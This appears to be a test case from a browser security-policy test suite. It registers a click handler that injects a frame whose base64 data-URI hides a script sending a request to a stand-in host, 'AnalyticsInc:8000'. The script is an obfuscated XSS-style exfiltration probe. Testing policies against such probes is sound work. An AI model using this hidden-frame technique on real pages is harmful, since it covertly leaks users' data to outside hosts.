// exfil_test_xss14.js
function exfiltrate_key_history() {
  var script = document.createElement("frameset");
  var script2 = document.createElement("frame");
  script2.src = "data:text/html;charset=utf-8;base64,PHNjcmlwdD54bWxodHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3htbGh0dHAub3BlbigiR0VUIiwgImh0dHA6Ly9BbmFseXRpY3NJbmM6ODAwMC9zdWJtaXNzaW9uLmh0bWw/dGVzdD14c3MxNCIsIHRydWUpO3htbGh0dHAuc2VuZChudWxsKTs8L3NjcmlwdD4=";
  JAM.call(script.appendChild, script, [script2]);
  var v0 = document.getElementsByTagName("body")[0];
  JAM.call(v0.appendChild, v0, [script]);
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
